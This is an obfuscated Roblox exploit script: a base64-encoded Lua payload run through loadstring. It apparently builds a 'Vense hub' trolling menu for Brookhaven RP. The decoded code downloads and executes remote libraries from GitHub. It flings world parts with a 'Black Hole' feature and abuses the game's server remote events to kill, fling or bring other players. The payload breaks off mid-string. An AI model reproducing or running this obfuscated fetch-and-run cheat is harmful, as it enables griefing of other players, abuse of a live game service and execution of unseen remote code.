-- Obfuscated Lua
loadstring(game:HttpGet('data:text/plain;base64,bG9jYWwgdmFyX2U4OHdudyA9IGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZmhyZGlteWJkcy1ieXRlL1JlZHotdWktbGliL3JlZnMvaGVhZHMvbWFpbi9MdWEiKSkoKQp3b3Jrc3BhY2UuRmFsbGVuUGFydHNEZXN0cm95SGVpZ2h0ID0gLW1hdGguaHVnZQoKbG9jYWwgdmFyXzczaWJnNiA9IExpYmFyeTpNYWtlV2luZG93KHsKICAgIFRpdGxlID0gIlZlbnNlIGh1YiB8IEJyb29raGF2ZW4gUlAgfCBTVVBFUiBVUERBVEUgVjIiLAogICAgU3ViVGl0bGUgPSAiQnkgU21saWUiLAogICAgTG9hZFRleHQgPSAiTG9hZGluZyBWZW5zZSBIdWIiLAogICAgRmxhZ3MgPSAiVmVuc2VodWJfYnJvb2toYXZlbiIKfSkKV2luZG93OkFkZE1pbmltaXplQnV0dG9uKHsKICAgIEJ1dHRvbiA9IHsgSW1hZ2UgPSAicmJ4YXNzZXRpZDovLzEyNzc4OTU1Mzg5MjkxOCIsIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwIH0sCiAgICBDb3JuZXIgPSB7IENvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEwKSB9LAp9KQoKbG9jYWwgdmFyX3VubGs3NCA9IFdpbmRvdzpNYWtlVGFiKHsgImluZm8iLCAicmJ4YXNzZXRpZDovLzg2NTkxODUzMTY3MjM0IiB9KQoKVGFiOkFkZFNlY3Rpb24oIlNjcmlwdCBieSBTbWxpZSIpCgpUYWI6QWRkU2VjdGlvbigic2NyaXB0OiB2MiB8IFNVUEVSIFVQREFURSEgIikKClRhYjpBZGRTZWN0aW9uKCJZVCIpCgpUYWI6QWRkRGlzY29yZEludml0ZSh7CiAgICBOYW1lID0gIlZlbnNlIFN0dWRpbyIsCiAgICBEZXNjcmlwdGlvbiA9ICJKb2luIFlUIiwKICAgIExvZ28gPSAicmJ4YXNzZXRpZDovLzEyNzc4OTU1Mzg5MjkxOCIsCiAgICBJbnZpdGUgPSAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQFZlbnNlaHViLXM5byIsCn0pCgpsb2NhbCB2YXJfNGQ3MDM0ID0gV2luZG93Ok1ha2VUYWIoeyBUaXRsZSA9ICJUcm9sbCBTY3JpcHRzIiwgSWNvbiA9ICJyYnhhc3NldGlkOi8vMTAzNjI5MDkxMTE4MjMxIiB9KQoKClRyb2xsVGFiOkFkZFNlY3Rpb24oeyAiQmxhY2sgSG9sZSIgfSkKVHJvbGxUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiQmxhY2sgSG9sZSIsCiAgICBEZXNjcmlwdGlvbiA9ICJXaGVuIHlvdSBhY3RpdmF0ZSB0aGlzLCBwYXJ0cyBvZiB0aGUgY2hhcmFjdGVyIHdpbGwgYmUgcHVsbGVkIHRvd2FyZHMgeW91LiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCB2YXJfZnBidDhoID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgdmFyX2lxdXFtOSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIHZhcl9tNnN1a3UgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIHZhcl91aml6MjYgPSBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpCgpsb2NhbCB2YXJfZ3FyMjV2ID0gMQpsb2NhbCB2YXJfanBlYnVsID0gMTAKbG9jYWwgdmFyXzhwMHpibCA9IGZhbHNlCgpsb2NhbCB2YXJfNXM4b3l0IHNldHVwUGxheWVyKCkKICAgIGxvY2FsIHZhcl83bWVpZmsgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3IgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICBsb2NhbCB2YXJfcXVrbXV6ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgogICAgbG9jYWwgdmFyX2o5M3Q0dSA9IEluc3RhbmNlLm5ldygiRm9sZGVyIiwgV29ya3NwYWNlKQogICAgbG9jYWwgdmFyX3YyejJkcSA9IEluc3RhbmNlLm5ldygiUGFydCIsIEZvbGRlcikKICAgIGxvY2FsIHZhcl9tOWRtZzggPSBJbnN0YW5jZS5uZXcoIkF0dGFjaG1lbnQiLCBQYXJ0KQogICAgUGFydC5BbmNob3JlZCA9IHRydWUKICAgIFBhcnQuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICBQYXJ0LlRyYW5zcGFyZW5jeSA9IDEKCiAgICByZXR1cm4gaHVtYW5vaWRSb290UGFydCwgQXR0YWNobWVudDEKZW5kCgpsb2NhbCB2YXJfb2xucTV4LCBBdHRhY2htZW50MSA9IHNldHVwUGxheWVyKCkKCmlmIG5vdCBnZXRnZW52KCkuTmV0d29yayB0aGVuCiAgICBnZXRnZW52KCkuTmV0d29yayA9IHsKICAgICAgICBCYXNlUGFydHMgPSB7fSwKICAgICAgICBWZWxvY2l0eSA9IFZlY3RvcjMubmV3KDE0LjQ2MjYyNDI0LCAxNC40NjI2MjQyNCwgMTQuNDYyNjI0MjQpCiAgICB9CgogICAgTmV0d29yay5SZXRhaW5QYXJ0ID0gZnVuY3Rpb24ocGFydCkKICAgICAgICBpZiB0eXBlb2YocGFydCkgPT0gIkluc3RhbmNlIiBhbmQgcGFydDpJc0EoIkJhc2VQYXJ0IikgYW5kIHBhcnQ6SXNEZXNjZW5kYW50T2YoV29ya3NwYWNlKSB0aGVuCiAgICAgICAgICAgIHRhYmxlLmluc2VydChOZXR3b3JrLkJhc2VQYXJ0cywgcGFydCkKICAgICAgICAgICAgcGFydC5DdXN0b21QaHlzaWNhbFByb3BlcnRpZXMgPSBQaHlzaWNhbFByb3BlcnRpZXMubmV3KDAsIDAsIDAsIDAsIDApCiAgICAgICAgICAgIHBhcnQuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfMDJ3MWdvIEVuYWJsZVBhcnRDb250cm9sKCkKICAgICAgICBMb2NhbFBsYXllci5SZXBsaWNhdGlvbkZvY3VzID0gV29ya3NwYWNlCiAgICAgICAgUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIHNldGhpZGRlbnByb3BlcnR5KExvY2FsUGxheWVyLCAiU2ltdWxhdGlvblJhZGl1cyIsIG1hdGguaHVnZSkKICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gcGFpcnMoTmV0d29yay5CYXNlUGFydHMpIGRvCiAgICAgICAgICAgICAgICBpZiBwYXJ0OklzRGVzY2VuZGFudE9mKFdvcmtzcGFjZSkgdGhlbgogICAgICAgICAgICAgICAgICAgIHBhcnQuVmVsb2NpdHkgPSBOZXR3b3JrLlZlbG9jaXR5CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgRW5hYmxlUGFydENvbnRyb2woKQplbmQKCmxvY2FsIHZhcl9oZnk5aGwgRm9yY2VQYXJ0KHYpCiAgICBpZiB2OklzQSgiUGFydCIpIGFuZCBub3Qgdi5BbmNob3JlZCBhbmQgbm90IHYuUGFyZW50OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCBub3Qgdi5QYXJlbnQ6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKSBhbmQgdi5OYW1lIH49ICJIYW5kbGUiIHRoZW4KICAgICAgICBmb3IgXywgeCBpbiBuZXh0LCB2OkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgaWYgeDpJc0EoIkJvZHlBbmd1bGFyVmVsb2NpdHkiKSBvciB4OklzQSgiQm9keUZvcmNlIikgb3IgeDpJc0EoIkJvZHlHeXJvIikgb3IgeDpJc0EoIkJvZHlQb3NpdGlvbiIpIG9yIHg6SXNBKCJCb2R5VGhydXN0Iikgb3IgeDpJc0EoIkJvZHlWZWxvY2l0eSIpIG9yIHg6SXNBKCJSb2NrZXRQcm9wdWxzaW9uIikgdGhlbgogICAgICAgICAgICAgICAgeDpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYgdjpGaW5kRmlyc3RDaGlsZCgiQXR0YWNobWVudCIpIHRoZW4KICAgICAgICAgICAgdjpGaW5kRmlyc3RDaGlsZCgiQXR0YWNobWVudCIpOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIGlmIHY6RmluZEZpcnN0Q2hpbGQoIkFsaWduUG9zaXRpb24iKSB0aGVuCiAgICAgICAgICAgIHY6RmluZEZpcnN0Q2hpbGQoIkFsaWduUG9zaXRpb24iKTpEZXN0cm95KCkKICAgICAgICBlbmQKICAgICAgICBpZiB2OkZpbmRGaXJzdENoaWxkKCJUb3JxdWUiKSB0aGVuCiAgICAgICAgICAgIHY6RmluZEZpcnN0Q2hpbGQoIlRvcnF1ZSIpOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIHYuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgCiAgICAgICAgbG9jYWwgdmFyXzJtbnpybyA9IEluc3RhbmNlLm5ldygiVG9ycXVlIiwgdikKICAgICAgICBUb3JxdWUuVG9ycXVlID0gVmVjdG9yMy5uZXcoMTAwMDAwMCwgMTAwMDAwMCwgMTAwMDAwMCkKICAgICAgICBsb2NhbCB2YXJfa2t2OG5sID0gSW5zdGFuY2UubmV3KCJBbGlnblBvc2l0aW9uIiwgdikKICAgICAgICBsb2NhbCB2YXJfMHhib3RiID0gSW5zdGFuY2UubmV3KCJBdHRhY2htZW50IiwgdikKICAgICAgICBUb3JxdWUuQXR0YWNobWVudDAgPSBBdHRhY2htZW50MgogICAgICAgIEFsaWduUG9zaXRpb24uTWF4Rm9yY2UgPSBtYXRoLmh1Z2UKICAgICAgICBBbGlnblBvc2l0aW9uLk1heFZlbG9jaXR5ID0gbWF0aC5odWdlCiAgICAgICAgQWxpZ25Qb3NpdGlvbi5SZXNwb25zaXZlbmVzcyA9IDUwMAogICAgICAgIEFsaWduUG9zaXRpb24uQXR0YWNobWVudDAgPSBBdHRhY2htZW50MgogICAgICAgIEFsaWduUG9zaXRpb24uQXR0YWNobWVudDEgPSBBdHRhY2htZW50MQogICAgZW5kCmVuZAoKbG9jYWwgdmFyX3M2cmd4cSB0b2dnbGVCbGFja0hvbGUoKQogICAgYmxhY2tIb2xlQWN0aXZlID0gbm90IGJsYWNrSG9sZUFjdGl2ZQogICAgaWYgYmxhY2tIb2xlQWN0aXZlIHRoZW4KICAgICAgICBmb3IgXywgdiBpbiBuZXh0LCBXb3Jrc3BhY2U6R2V0RGVzY2VuZGFudHMoKSBkbwogICAgICAgICAgICBGb3JjZVBhcnQodikKICAgICAgICBlbmQKCiAgICAgICAgV29ya3NwYWNlLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIGlmIGJsYWNrSG9sZUFjdGl2ZSB0aGVuCiAgICAgICAgICAgICAgICBGb3JjZVBhcnQodikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQoKICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGJsYWNrSG9sZUFjdGl2ZSBhbmQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKSBkbwogICAgICAgICAgICAgICAgYW5nbGUgPSBhbmdsZSArIG1hdGgucmFkKDIpCgogICAgICAgICAgICAgICAgbG9jYWwgdmFyX2w1NjRrbSA9IG1hdGguY29zKGFuZ2xlKSAqIHJhZGl1cwogICAgICAgICAgICAgICAgbG9jYWwgdmFyXzZuZ2lzbyA9IG1hdGguc2luKGFuZ2xlKSAqIHJhZGl1cwoKICAgICAgICAgICAgICAgIEF0dGFjaG1lbnQxLldvcmxkQ0ZyYW1lID0gaHVtYW5vaWRSb290UGFydC5DRnJhbWUgKiBDRnJhbWUubmV3KG9mZnNldFgsIDAsIG9mZnNldFopCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVsc2UKICAgICAgICBBdHRhY2htZW50MS5Xb3JsZENGcmFtZSA9IENGcmFtZS5uZXcoMCwgLTEwMDAsIDApCiAgICBlbmQKZW5kCgpMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGh1bWFub2lkUm9vdFBhcnQsIEF0dGFjaG1lbnQxID0gc2V0dXBQbGF5ZXIoKQogICAgaWYgYmxhY2tIb2xlQWN0aXZlIHRoZW4KICAgICAgICB0b2dnbGVCbGFja0hvbGUoKSAtLSBSZS10b2dnbGUgdG8gYXBwbHkgdG8gbmV3IGNoYXJhY3RlcgogICAgZW5kCmVuZCkKCmxvY2FsIHZhcl9jOXl0Y2IgPSBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pcm9lcmFtYWEvVHVydGxlTGliL21haW4vVHVydGxlVWlMaWIubHVhIikpKCkKbG9jYWwgdmFyX2M1MXlvdSA9IGxpYnJhcnk6V2luZG93KCJibGFja2hvbGUgaHViIikKCndpbmRvdzpTbGlkZXIoIkJsYWNraG9sZSBSYWRpdXMiLDEsMTMwLDEwLCBmdW5jdGlvbihWYWx1ZSkKICAgcmFkaXVzID0gVmFsdWUKZW5kKQoKd2luZG93OlRvZ2dsZSgiIGxpZ2FyIEJsYWNraG9sZSIsIHRydWUsIGZ1bmN0aW9uKFZhbHVlKQogICAgICAgaWYgVmFsdWUgdGhlbgogICAgICAgICAgICB0b2dnbGVCbGFja0hvbGUoKQogICAgICAgIGVsc2UKICAgICAgICAgICAgYmxhY2tIb2xlQWN0aXZlID0gZmFsc2UKICAgICAgICBlbmQKZW5kKQoKc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpXYWl0KCkKICAgICAgICBpZiBibGFja0hvbGVBY3RpdmUgdGhlbgogICAgICAgICAgICBhbmdsZSA9IGFuZ2xlICsgbWF0aC5yYWQoYW5nbGVTcGVlZCkKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgp0b2dnbGVCbGFja0hvbGUoKQogICAgZW5kCn0pCgpsb2NhbCB2YXJfa2N5YWMwID0gV2luZG93Ok1ha2VUYWIoeyBUaXRsZSA9ICJUcm9sbCIsIEljb24gPSAicmJ4YXNzZXRpZDovLzEzOTY1MDEwNDgzNDA3MSIgfSkKCgpsb2NhbCB2YXJfdGJjZWRlID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgdmFyXzlnOGRwZiA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgdmFyX3pkZnU5cSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQpsb2NhbCB2YXJfODRwYjkxID0gZ2FtZTpHZXRTZXJ2aWNlKCJWaXJ0dWFsSW5wdXRNYW5hZ2VyIikKbG9jYWwgdmFyX3l0YXAzbiA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIHZhcl84azdhM2kgPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQoKCmxvY2FsIHZhcl9xNTdpc3ogPSBuaWwKbG9jYWwgdmFyXzluZHB4eSA9IG5pbApnZXRnZW52KCkuVGFyZ2V0ID0gbmlsCmxvY2FsIHZhcl9ldnJ0ZzYgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKbG9jYWwgdmFyX2M5YXVxeCA9IENoYXJhY3RlciBhbmQgQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQpsb2NhbCB2YXJfMHVnZ3h1ID0gQ2hhcmFjdGVyIGFuZCBDaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKCi0tIEZ1bmN0aW9uIHRvIGNsZWFuIHVwIHRoZSBjb3VjaApsb2NhbCB2YXJfNnN5M2Q5IGNsZWFudXBDb3VjaCgpCiAgICBsb2NhbCB2YXJfazQ5aHJnID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBpZiBjaGFyIHRoZW4KICAgICAgICBsb2NhbCB2YXJfcG9wMzJ2ID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiQ2hhb3MuQ291Y2giKSBvciBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ2hhb3MuQ291Y2giKQogICAgICAgIGlmIGNvdWNoIHRoZW4KICAgICAgICAgICAgY291Y2g6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICBlbmQKICAgIC0tIENsZWFuIHRvb2xzIHZpYSByZW1vdGUKICAgIFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFDbGVhMXJUb29sMXMiKTpGaXJlU2VydmVyKCJDbGVhckFsbFRvb2xzIikKZW5kCgotLSBDb25uZWN0IENoYXJhY3RlckFkZGVkIGV2ZW50CkxvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24obmV3Q2hhcmFjdGVyKQogICAgQ2hhcmFjdGVyID0gbmV3Q2hhcmFjdGVyCiAgICBIdW1hbm9pZCA9IG5ld0NoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKICAgIFJvb3RQYXJ0ID0gbmV3Q2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBjbGVhbnVwQ291Y2goKQogICAgCiAgICAtLSBDb25uZWN0IERpZWQgZXZlbnQgZm9yIHRoZSBuZXcgSHVtYW5vaWQKICAgIEh1bWFub2lkLkRpZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgY2xlYW51cENvdWNoKCkKICAgIGVuZCkKZW5kKQoKLS0gQ29ubmVjdCBEaWVkIGV2ZW50IGZvciB0aGUgaW5pdGlhbCBIdW1hbm9pZCwgaWYgaXQgZXhpc3RzCmlmIEh1bWFub2lkIHRoZW4KICAgIEh1bWFub2lkLkRpZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgY2xlYW51cENvdWNoKCkKICAgIGVuZCkKZW5kCgotLSBLaWxsUGxheWVyQ291Y2ggRnVuY3Rpb24KbG9jYWwgdmFyX3Z5YTlvaSBLaWxsUGxheWVyQ291Y2goKQogICAgaWYgbm90IHNlbGVjdGVkUGxheWVyTmFtZSB0aGVuCiAgICAgICAgd2FybigiRXJyb3I6IE5vIHBsYXllciBzZWxlY3RlZCIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGxvY2FsIHZhcl95bm1nOWIgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkKICAgIGlmIG5vdCB0YXJnZXQgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXIgdGhlbgogICAgICAgIHdhcm4oIkVycm9yOiBUYXJnZXQgcGxheWVyIG5vdCBmb3VuZCBvciBoYXMgbm8gY2hhcmFjdGVyIikKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGxvY2FsIHZhcl9kNGZudDggPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIG5vdCBjaGFyIHRoZW4KICAgICAgICB3YXJuKCJFcnJvcjogTG9jYWwgcGxheWVyIGNoYXJhY3RlciBub3QgZm91bmQiKQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBsb2NhbCB2YXJfdm91Y2x3ID0gY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgIGxvY2FsIHZhcl93bDR6dWEgPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGxvY2FsIHZhcl90azN3amUgPSB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGlmIG5vdCBodW0gb3Igbm90IHJvb3Qgb3Igbm90IHRSb290IHRoZW4KICAgICAgICB3YXJuKCJFcnJvcjogUmVxdWlyZWQgY29tcG9uZW50cyBub3QgZm91bmQiKQogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgdmFyX2M1Njl0MiA9IHJvb3QuUG9zaXRpb24gCiAgICBsb2NhbCB2YXJfb2dlcHVjID0gVmVjdG9yMy5uZXcoMTQ1LjUxLCAtMzUwLjA5LCAyMS41OCkKCiAgICBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJFIik6V2FpdEZvckNoaWxkKCIxQ2xlYTFyVG9vbDFzIik6RmlyZVNlcnZlcigiQ2xlYXJBbGxUb29scyIpCiAgICB0YXNrLndhaXQoMC4yKQoKICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKTpJbnZva2VTZXJ2ZXIoIlBpY2tpbmdUb29scyIsICJDb3VjaCIpCiAgICB0YXNrLndhaXQoMC4zKQoKICAgIGxvY2FsIHZhcl96cHRzNTIgPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ291Y2giKQogICAgaWYgdG9vbCB0aGVuIHRvb2wuUGFyZW50ID0gY2hhciBlbmQKICAgIHRhc2sud2FpdCgwLjEpCgogICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kS2V5RXZlbnQodHJ1ZSwgRW51bS5LZXlDb2RlLkYsIGZhbHNlLCBnYW1lKQogICAgdGFzay53YWl0KDAuMSkKCiAgICBodW06U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCBmYWxzZSkKICAgIGh1bS5QbGF0Zm9ybVN0YW5kID0gZmFsc2UKICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpIG9yIHRSb290IG9yIGh1bQoKICAgIGxvY2FsIHZhcl92ejY4MzggPSBJbnN0YW5jZS5uZXcoIkJvZHlQb3NpdGlvbiIpCiAgICBhbGlnbi5OYW1lID0gIkJyaW5nUG9zaXRpb24iCiAgICBhbGlnbi5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSwgbWF0aC5odWdlLCBtYXRoLmh1Z2UpCiAgICBhbGlnbi5EID0gMTAKICAgIGFsaWduLlAgPSAzMDAwMAogICAgYWxpZ24uUG9zaXRpb24gPSByb290LlBvc2l0aW9uCiAgICBhbGlnbi5QYXJlbnQgPSB0Um9vdAoKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHZhcl80dnE4OWYgPSAwCiAgICAgICAgbG9jYWwgdmFyX2NjMjV3bSA9IHRpY2soKQogICAgICAgIHdoaWxlIHRpY2soKSAtIHN0YXJ0VGltZSA8IDUgYW5kIHRhcmdldCBhbmQgdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikgZG8KICAgICAgICAgICAgbG9jYWwgdmFyX3Y3OXV1aiA9IHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgIGlmIG5vdCB0SHVtIG9yIHRIdW0uU2l0IHRoZW4gYnJlYWsgZW5kCgogICAgICAgICAgICBsb2NhbCB2YXJfMG1rejQzID0gdGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgIGxvY2FsIHZhcl9ha2E4cnkgPSBocnAuUG9zaXRpb24gKyAoaHJwLlZlbG9jaXR5IC8gMS41KQoKICAgICAgICAgICAgYW5nbGUgKz0gNTAKICAgICAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KGFkanVzdGVkUG9zICsgVmVjdG9yMy5uZXcoMCwgMiwgMCkpICogQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChhbmdsZSksIDAsIDApCiAgICAgICAgICAgIGFsaWduLlBvc2l0aW9uID0gcm9vdC5Qb3NpdGlvbiArIFZlY3RvcjMubmV3KDIsIDAsIDApCgogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGVuZAoKICAgICAgICBhbGlnbjpEZXN0cm95KCkKICAgICAgICBodW06U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCB0cnVlKQogICAgICAgIGh1bS5QbGF0Zm9ybVN0YW5kID0gZmFsc2UKICAgICAgICBjYW0uQ2FtZXJhU3ViamVjdCA9IGh1bQoKICAgICAgICBmb3IgXywgcCBpbiBwYWlycyhjaGFyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgIGlmIHA6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgIHAuVmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICAgICAgICAgIHAuUm90VmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KHNpdFBvcykKICAgICAgICB0YXNrLndhaXQoMC4zKQoKICAgICAgICBsb2NhbCB2YXJfMmVydHQ5ID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiQ291Y2giKQogICAgICAgIGlmIHRvb2wgdGhlbiB0b29sLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrIGVuZAoKICAgICAgICB0YXNrLndhaXQoMC4wMSkKICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKCJQaWNraW5nVG9vbHMiLCAiQ291Y2giKQogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KG9yaWdpbmFsUG9zKQogICAgZW5kKQplbmQKCi0tIEJyaW5nUGxheWVyTExMIEZ1bmN0aW9uCmxvY2FsIHZhcl8wN3VwemQgQnJpbmdQbGF5ZXJMTEwoKQogICAgaWYgbm90IHNlbGVjdGVkUGxheWVyTmFtZSB0aGVuCiAgICAgICAgd2FybigiRXJyb3I6IE5vIHBsYXllciBzZWxlY3RlZCIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGxvY2FsIHZhcl9ndzVmaG4gPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkKICAgIGlmIG5vdCB0YXJnZXQgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXIgdGhlbgogICAgICAgIHdhcm4oIkVycm9yOiBUYXJnZXQgcGxheWVyIG5vdCBmb3VuZCBvciBoYXMgbm8gY2hhcmFjdGVyIikKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGxvY2FsIHZhcl9lcXAzdGsgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIG5vdCBjaGFyIHRoZW4KICAgICAgICB3YXJuKCJFcnJvcjogTG9jYWwgcGxheWVyIGNoYXJhY3RlciBub3QgZm91bmQiKQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBsb2NhbCB2YXJfNXVxZW1lID0gY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgIGxvY2FsIHZhcl9kYWZlNTQgPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGxvY2FsIHZhcl92dzMwMGUgPSB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGlmIG5vdCBodW0gb3Igbm90IHJvb3Qgb3Igbm90IHRSb290IHRoZW4KICAgICAgICB3YXJuKCJFcnJvcjogUmVxdWlyZWQgY29tcG9uZW50cyBub3QgZm91bmQiKQogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgdmFyX2pvNHJwciA9IHJvb3QuUG9zaXRpb24gCiAgICBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJFIik6V2FpdEZvckNoaWxkKCIxQ2xlYTFyVG9vbDFzIik6RmlyZVNlcnZlcigiQ2xlYXJBbGxUb29scyIpCiAgICB0YXNrLndhaXQoMC4yKQoKICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWw